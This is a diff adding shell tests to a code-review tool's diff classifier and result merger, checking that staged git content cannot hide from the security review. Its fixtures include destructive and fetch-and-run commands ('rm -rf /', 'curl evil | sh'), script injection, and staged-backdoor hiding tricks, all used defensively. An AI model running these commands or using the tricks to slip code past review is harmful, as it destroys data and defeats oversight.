@@ -761,6 +761,253 @@ check_eq "a successful classification leaves no temp scope file" "" "${LEFTOVER:
 
 echo ""
 
+# ================================================ index vs worktree divergence ==
+#
+# The index and the worktree can hold DIFFERENT content for the same path, and
+# both of the new mechanisms originally looked only at the worktree. A
+# documentation file could be STAGED carrying a <script> and then edited back to
+# inert prose, and the classifier - reading only the worktree copy - marked the
+# whole round documentation-only and skipped both lenses. The delta had the
+# mirror hole: staged content the worktree copy hid was simply absent from it.
+#
+# The invariant these pin down: nothing that is part of the uncommitted change
+# may be invisible to the inertness check or to the delta.
+echo "index vs worktree divergence (staged content cannot hide behind the worktree)"
+
+# staged_case <label> <path> <staged-content> <worktree-content>
+staged_case() {
+  local label="$1" path="$2" staged="$3" worktree="$4"
+  SPLIT_DIR="$(mktemp -d "$ROOT/split.XXXXXX")"
+  SPLIT_REPO="$SPLIT_DIR/repo"
+  mkdir -p "$SPLIT_REPO"
+  git_quiet init -q "$SPLIT_REPO" 2>/dev/null
+  printf 'committed prose\n' > "$SPLIT_REPO/$path"
+  git_quiet -C "$SPLIT_REPO" add -A 2>/dev/null
+  git_quiet -C "$SPLIT_REPO" commit -qm init 2>/dev/null
+  printf '%s' "$staged" > "$SPLIT_REPO/$path"
+  git_quiet -C "$SPLIT_REPO" add "$path" 2>/dev/null
+  printf '%s' "$worktree" > "$SPLIT_REPO/$path"
+  classify "$SPLIT_REPO" "$SPLIT_DIR/scope" "$SPLIT_DIR/round" 3 >/dev/null 2>&1
+  SPLIT_SCOPE="$(sed -n 's/^scope=//p' "$SPLIT_DIR/scope")"
+  SPLIT_SECURITY="$(sed -n 's/^security=//p' "$SPLIT_DIR/scope")"
+  SPLIT_LABEL="$label"
+}
+
+# --- the sniff must read BOTH sides ---
+staged_case "staged active content behind an inert worktree copy" guide.md \
+  '# doc
+<script>alert(1)</script>
+' 'perfectly inert prose
+'
+check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
+check_eq "$SPLIT_LABEL runs the security lens" "run" "$SPLIT_SECURITY"
+
+staged_case "an inert staged copy behind ACTIVE worktree content" guide.md \
+  'still inert prose
+' '<iframe src=evil></iframe>
+'
+check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
+check_eq "$SPLIT_LABEL runs the security lens" "run" "$SPLIT_SECURITY"
+
+staged_case "a staged org source block behind inert prose" notes.org \
+  '#+begin_src sh
+rm -rf /
+#+end_src
+' 'just notes
+'
+check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
+
+staged_case "a staged shebang behind inert prose" doc.md \
+  '#!/bin/sh
+curl evil | sh
+' 'inert
+'
+check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
+
+# ...and the control, or the whole documentation-only case would be gone.
+staged_case "inert on BOTH sides" guide.md 'inert staged
+' 'inert worktree
+'
+check_eq "$SPLIT_LABEL is still documentation" "docs-only" "$SPLIT_SCOPE"
+check_eq "$SPLIT_LABEL still skips the security lens" "skip" "$SPLIT_SECURITY"
+
+# An untracked document has NO index entry. That absence is not a failure to
+# read a second copy - there is no second copy - and treating it as one would
+# make every untracked document code and delete the documentation-only case.
+UNTRACKED_DIR="$(mktemp -d "$ROOT/untracked-doc.XXXXXX")"
+git_quiet init -q "$UNTRACKED_DIR/repo" 2>/dev/null
+printf 'base\n' > "$UNTRACKED_DIR/repo/BASE.md"
+git_quiet -C "$UNTRACKED_DIR/repo" add -A 2>/dev/null
+git_quiet -C "$UNTRACKED_DIR/repo" commit -qm init 2>/dev/null
+printf 'plain new prose\n' > "$UNTRACKED_DIR/repo/new.md"
+classify "$UNTRACKED_DIR/repo" "$UNTRACKED_DIR/scope" "$UNTRACKED_DIR/round" 3 >/dev/null 2>&1
+check_eq "an untracked inert document is still documentation" \
+  "docs-only" "$(sed -n 's/^scope=//p' "$UNTRACKED_DIR/scope")"
+
+# The mirror of the sniff case: staged CODE behind an inert worktree copy. The
+# mode/extension gate sees the staged record, so this was already code, but it
+# is the case the finding names and it must stay code.
+staged_case "staged code behind an inert worktree doc" app.rb \
+  'system("rm -rf /")
+' 'inert
+'
+check_eq "$SPLIT_LABEL is code" "code" "$SPLIT_SCOPE"
+
+# --- a staged DELETION cannot be laundered by recreating the path ---
+#
+# A tracked document can be staged for deletion and then RECREATED at the same
+# path as inert untracked content. The staged raw record still says D, but the
+# sniff used to read the recreated worktree file, find no stage-0 index entry,
+# and hand back documentation-only - breaking both the "a deleted document is
+# unvouchable" invariant and the untracked exception at once.
+DEL_DIR="$(mktemp -d "$ROOT/staged-del.XXXXXX")"
+DEL_REPO="$DEL_DIR/repo"
+mkdir -p "$DEL_REPO"
+git_quiet init -q "$DEL_REPO" 2>/dev/null
+printf '# doc\n<script>alert(1)</script>\n' > "$DEL_REPO/guide.md"
+git_quiet -C "$DEL_REPO" add -A 2>/dev/null
+git_quiet -C "$DEL_REPO" commit -qm init 2>/dev/null
+git_quiet -C "$DEL_REPO" rm -q --cached guide.md 2>/dev/null
+printf 'perfectly inert prose\n' > "$DEL_REPO/guide.md"
+classify "$DEL_REPO" "$DEL_DIR/scope" "$DEL_DIR/round" 3 >/dev/null 2>&1
+check_eq "a staged deletion recreated as inert untracked content is code" \
+  "code" "$(sed -n 's/^scope=//p' "$DEL_DIR/scope")"
+check_eq "and it runs the security lens" \
+  "run" "$(sed -n 's/^security=//p' "$DEL_DIR/scope")"
+check_eq "the recreated path is named as the code path" \
+  "guide.md" "$(sed -n 's/^first_code_path=//p' "$DEL_DIR/scope")"
+
+# The same shape with an ORIGINAL that was itself inert: it is the deletion that
+# makes this unvouchable, not what the deleted content happened to contain.
+DEL2_DIR="$(mktemp -d "$ROOT/staged-del2.XXXXXX")"
+DEL2_REPO="$DEL2_DIR/repo"
+mkdir -p "$DEL2_REPO"
+git_quiet init -q "$DEL2_REPO" 2>/dev/null
+printf 'plain prose\n' > "$DEL2_REPO/guide.md"
+git_quiet -C "$DEL2_REPO" add -A 2>/dev/null
+git_quiet -C "$DEL2_REPO" commit -qm init 2>/dev/null
+git_quiet -C "$DEL2_REPO" rm -q --cached guide.md 2>/dev/null
+printf 'other inert prose\n' > "$DEL2_REPO/guide.md"
+classify "$DEL2_REPO" "$DEL2_DIR/scope" "$DEL2_DIR/round" 3 >/dev/null 2>&1
+check_eq "an inert document staged-deleted and recreated is still code" \
+  "code" "$(sed -n 's/^scope=//p' "$DEL2_DIR/scope")"
+
+# ...and the untracked exception must survive all of that, or the whole
+# documentation-only case is gone.
+check_eq "an ordinary untracked document is still documentation" \
+  "docs-only" "$(sed -n 's/^scope=//p' "$UNTRACKED_DIR/scope")"
+
+# --- the delta must cover index content too ---
+#
+# Staging a change and putting the worktree copy back to the already-reviewed
+# text produced a delta that omitted the staged content while the uncommitted
+# change still carried it.
+HID_DIR="$(mktemp -d "$ROOT/hidden.XXXXXX")"
+HID_REPO="$HID_DIR/repo"
+mkdir -p "$HID_REPO"
+git_quiet init -q "$HID_REPO" 2>/dev/null
+printf 'v1\n' > "$HID_REPO/app.rb"
+printf 'w1\n' > "$HID_REPO/other.rb"
+git_quiet -C "$HID_REPO" add -A 2>/dev/null
+git_quiet -C "$HID_REPO" commit -qm init 2>/dev/null
+printf 'v2 reviewed in round 1\n' > "$HID_REPO/app.rb"
+classify "$HID_REPO" "$HID_DIR/scope" "$HID_DIR/round" 3 "$HID_DIR/baseline" >/dev/null 2>&1
+"$CAPTURE" "$HID_REPO" "$HID_DIR/baseline" 1 >/dev/null 2>&1
+# A genuine worktree fix, so delta mode engages at all...
+printf 'w2 a genuine fix\n' > "$HID_REPO/other.rb"
+# ...and a backdoor staged, then hidden behind the already-reviewed worktree text.
+printf 'v3 STAGED BACKDOOR\n' > "$HID_REPO/app.rb"
+git_quiet -C "$HID_REPO" add app.rb 2>/dev/null
+printf 'v2 reviewed in round 1\n' > "$HID_REPO/app.rb"
+classify "$HID_REPO" "$HID_DIR/scope" "$HID_DIR/round" 3 "$HID_DIR/baseline" >/dev/null 2>&1
+check_eq "the hidden-staged round still deltas" "delta" \
+  "$(sed -n 's/^review_mode=//p' "$HID_DIR/scope")"
+check_contains "the delta carries the genuine worktree fix" \
+  "$(cat "$HID_DIR/scope.delta")" "w2 a genuine fix"
+check_contains "the delta carries the STAGED content the worktree hid" \
+  "$(cat "$HID_DIR/scope.delta")" "STAGED BACKDOOR"
+
+# A fix that was staged and NOT left in the worktree is real work: it must count
+# as a non-empty delta rather than falling back to a full re-read.
+ONLY_DIR="$(mktemp -d "$ROOT/stagedonly.XXXXXX")"
+ONLY_REPO="$ONLY_DIR/repo"
+mkdir -p "$ONLY_REPO"
+git_quiet init -q "$ONLY_REPO" 2>/dev/null
+printf 'v1\n' > "$ONLY_REPO/app.rb"
+git_quiet -C "$ONLY_REPO" add -A 2>/dev/null
+git_quiet -C "$ONLY_REPO" commit -qm init 2>/dev/null
+printf 'v2 reviewed\n' > "$ONLY_REPO/app.rb"
+classify "$ONLY_REPO" "$ONLY_DIR/scope" "$ONLY_DIR/round" 3 "$ONLY_DIR/baseline" >/dev/null 2>&1
+"$CAPTURE" "$ONLY_REPO" "$ONLY_DIR/baseline" 1 >/dev/null 2>&1
+printf 'v3 staged fix only\n' > "$ONLY_REPO/app.rb"
+git_quiet -C "$ONLY_REPO" add app.rb 2>/dev/null
+printf 'v2 reviewed\n' > "$ONLY_REPO/app.rb"
+classify "$ONLY_REPO" "$ONLY_DIR/scope" "$ONLY_DIR/round" 3 "$ONLY_DIR/baseline" >/dev/null 2>&1
+check_eq "a staged-only fix still produces a delta" "delta" \
+  "$(sed -n 's/^review_mode=//p' "$ONLY_DIR/scope")"
+check_contains "the staged-only fix is in the delta" \
+  "$(cat "$ONLY_DIR/scope.delta")" "staged fix only"
+
+# --- an index that MOVED since the review must show up ---
+#
+# A fix that was staged when the previous round reviewed it can be reset back to
+# HEAD afterwards. The worktree still holds it, so the worktree diff says
+# nothing, and it is not staged against HEAD any more, so the staged-vs-HEAD
+# rule says nothing either. The reference point that does work is the index AS
+# IT WAS AT THE LAST REVIEW - git stash create records it as the baseline
+# commit's second parent - because an index that has moved since a lens looked
+# at it is exactly the event worth showing.
+REV_DIR="$(mktemp -d "$ROOT/reverted.XXXXXX")"
+REV_REPO="$REV_DIR/repo"
+mkdir -p "$REV_REPO"
+git_quiet init -q "$REV_REPO" 2>/dev/null
+printf 'v1\n' > "$REV_REPO/app.rb"
+printf 'w1\n' > "$REV_REPO/other.rb"
+git_quiet -C "$REV_REPO" add -A 2>/dev/null
+git_quiet -C "$REV_REPO" commit -qm init 2>/dev/null
+# Round 1 reviews the fix, and the fix is STAGED at that moment.
+printf 'v2 THE REVIEWED FIX\n' > "$REV_REPO/app.rb"
+git_quiet -C "$REV_REPO" add app.rb 2>/dev/null
+classify "$REV_REPO" "$REV_DIR/scope" "$REV_DIR/round" 3 "$REV_DIR/baseline" >/dev/null 2>&1
+"$CAPTURE" "$REV_REPO" "$REV_DIR/baseline" 1 >/dev/null 2>&1
+# Round 2: the index is reset back to HEAD, quietly dropping the reviewed fix
+# from what would be committed. Another path changes so delta mode stays on.
+git_quiet -C "$REV_REPO" reset -q HEAD -- app.rb 2>/dev/null
+printf 'w2 an unrelated change\n' > "$REV_REPO/other.rb"
+classify "$REV_REPO" "$REV_DIR/scope" "$REV_DIR/round" 3 "$REV_DIR/baseline" >/dev/null 2>&1
+check_eq "the reverted-index round still deltas" "delta" \
+  "$(sed -n 's/^review_mode=//p' "$REV_DIR/scope")"
+check_contains "the delta carries the unrelated change that kept it engaged" \
+  "$(cat "$REV_DIR/scope.delta")" "w2 an unrelated change"
+check_contains "the delta shows the reviewed fix leaving the index" \
+  "$(cat "$REV_DIR/scope.delta")" "THE REVIEWED FIX"
+check_contains "the delta names the path whose index moved" \
+  "$(cat "$REV_DIR/scope.delta")" "a/app.rb"
+
+# ...and an ORDINARY unstaged round must not gain a reverse diff back to the
+# committed text. Without the staged-vs-HEAD filter every delta doubled and told
+# the lens a reversion had happened that had not.
+QUIET_DIR="$(mktemp -d "$ROOT/quiet.XXXXXX")"
+QUIET_REPO="$QUIET_DIR/repo"
+mkdir -p "$QUIET_REPO"
+git_quiet init -q "$QUIET_REPO" 2>/dev/null
+printf 'v1\n' > "$QUIET_REPO/app.rb"
+git_quiet -C "$QUIET_REPO" add -A 2>/dev/null
+git_quiet -C "$QUIET_REPO" commit -qm init 2>/dev/null
+printf 'v2 reviewed\n' > "$QUIET_REPO/app.rb"
+classify "$QUIET_REPO" "$QUIET_DIR/scope" "$QUIET_DIR/round" 3 "$QUIET_DIR/baseline" >/dev/null 2>&1
+"$CAPTURE" "$QUIET_REPO" "$QUIET_DIR/baseline" 1 >/dev/null 2>&1
+printf 'v3 plain unstaged fix\n' > "$QUIET_REPO/app.rb"
+classify "$QUIET_REPO" "$QUIET_DIR/scope" "$QUIET_DIR/round" 3 "$QUIET_DIR/baseline" >/dev/null 2>&1
+check_contains "an ordinary delta carries the fix" \
+  "$(cat "$QUIET_DIR/scope.delta")" "v3 plain unstaged fix"
+check_absent "an ordinary delta gains no reverse diff to the committed text" \
+  "$(cat "$QUIET_DIR/scope.delta")" "+v1"
+check_eq "an ordinary delta contains exactly one file header" "1" \
+  "$(grep -c '^diff --git' "$QUIET_DIR/scope.delta")"
+
+echo ""
+
 # ========================================================== delta review scope ==
 #
 # Round 1 is the real review and always reads the full uncommitted diff. Later
@@ -1233,6 +1480,48 @@ check_eq "two clean lenses raise no findings" "0" "$(jq '.must_fix | length' "$M
 check_absent "two clean lenses get no failure banner" \
   "$(jq -r '.summary' "$M/out3.json")" "[lens run FAILED]"
 
+# A lens result can be schema-SHAPED and still be internally inconsistent:
+# verdict "pass" while the must_fix array carries a blocking finding. That used
+# to merge into an aggregate whose top-level verdict said "pass" while its
+# must_fix array held the finding - and the GUI reads that top-level verdict, so
+# a blocking review read as a pass.
+M="$ROOT/merge-inconsistent"
+mkdir -p "$M"
+printf '{"verdict":"pass","summary":"ok","must_fix":["[SEC-004] real issue"],"should_fix":[],"test_gaps":[]}\n' > "$M/c.json"
+fresh_pass "No issues found." > "$M/s.json"
+printf '0\n' > "$M/c.status"; printf '0\n' > "$M/s.status"
+"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
+check_ne "a pass carrying must_fix findings fails the merge" "0" "$?"
+check_ne "a pass carrying must_fix findings is NOT published as a pass" \
+  "pass" "$(jq -r '.verdict' "$M/out.json")"
+check_ne "a pass carrying must_fix findings leaves a non-zero status" \
+  "0" "$(cat "$M/out.status")"
+check_contains "check_result names the inconsistency" \
+  "$("$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/o2.json" "$M/o2.status" 2>&1)" \
+  'says verdict "pass" but carries must_fix findings'
+
+# The same on the security side, so the check is not one-sided.
+fresh_pass "No issues found." > "$M/c.json"
+printf '{"verdict":"pass","summary":"ok","must_fix":["[SEC-001] boundary"],"should_fix":[],"test_gaps":[]}\n' > "$M/s.json"
+"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
+check_ne "an inconsistent SECURITY result is caught too" \
+  "pass" "$(jq -r '.verdict' "$M/out.json")"
+
+# A lens being conservative - verdict must_fix with an empty array - already
+# blocks, so it is deliberately tolerated rather than turned into a hard error.
+printf '{"verdict":"must_fix","summary":"uneasy","must_fix":[],"should_fix":[],"test_gaps":[]}\n' > "$M/c.json"
+fresh_pass "No issues found." > "$M/s.json"
+"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
+check_eq "a conservative must_fix with no findings still merges" "0" "$?"
+check_eq "and it still blocks" "must_fix" "$(jq -r '.verdict' "$M/out.json")"
+
+# Whatever else changed, a genuinely clean pair must still be a pass.
+fresh_pass "No issues found." > "$M/c.json"
+fresh_pass "No issues found." > "$M/s.json"
+"$MERGE" "$M/c.json" "$M/c.status" "$M/s.json" "$M/s.status" "$M/out.json" "$M/out.status" >/dev/null 2>&1
+check_eq "a genuinely clean pair is still a pass" "pass" "$(jq -r '.verdict' "$M/out.json")"
+check_eq "a genuinely clean pair is still status 0" "0" "$(cat "$M/out.status")"
+
 # The union and the lens tagging are untouched by all of the above.
 M="$ROOT/merge-union"
 mkdir -p "$M"
@@ -1271,6 +1560,20 @@ else
   check_file "squad-herdr generates the correctness checklist" "$HGEN/checklist.correctness.md"
   check_file "squad-herdr generates the security checklist" "$HGEN/checklist.security.md"
   check_file "squad-herdr generates the diff classifier" "$HGEN/classify-diff"
+
+  # Every classifier and delta assertion in this suite runs against SQUAD's
+  # generated helper. squad-herdr keeps byte-identical copies of the three
+  # shared helpers, and that is the only thing making those assertions speak for
+  # it too - so a regression landing in one script and not the other is caught
+  # here rather than silently going unreviewed on the herdr side.
+  for shared in classify-diff capture-review-baseline write-lens-result; do
+    if diff -q "$GEN/$shared" "$HGEN/$shared" >/dev/null 2>&1; then
+      ok "squad and squad-herdr generate an identical $shared"
+    else
+      no "squad and squad-herdr generate an identical $shared" \
+        "the two copies have diverged; the assertions above cover only squad's"
+    fi
+  done
   check_file "squad-herdr generates the lens-result writer" "$HGEN/write-lens-result"
 
   HPROMPT="$(cat "$HGEN/manager-prompt.md")"
@@ -1324,6 +1627,17 @@ else
     "must_fix" "$(jq -r '.verdict' "$HM/out.json")"
   check_contains "squad-herdr names the failed lens too" \
     "$(jq -r '.must_fix | join("\n")' "$HM/out.json")" "[correctness] LENS RUN FAILED with status 2"
+
+  # squad-herdr's merge-reviews is a separate port, so the pass-carrying-
+  # must_fix fix has to be asserted against that copy too.
+  printf '{"verdict":"pass","summary":"ok","must_fix":["[SEC-004] real issue"],"should_fix":[],"test_gaps":[]}\n' > "$HM/c.json"
+  fresh_pass "No issues found." > "$HM/s.json"
+  printf '0\n' > "$HM/c.status"; printf '0\n' > "$HM/s.status"
+  "$HGEN/merge-reviews" "$HM/c.json" "$HM/c.status" "$HM/s.json" "$HM/s.status" \
+    "$HM/inc.json" "$HM/inc.status" >/dev/null 2>&1
+  check_ne "squad-herdr refuses a pass carrying must_fix findings" \
+    "pass" "$(jq -r '.verdict' "$HM/inc.json")"
+  check_ne "squad-herdr leaves a non-zero status for it" "0" "$(cat "$HM/inc.status")"
 
   HVICTIM="$ROOT/herdr-victim.txt"
   printf 'PRECIOUS\n' > "$HVICTIM"
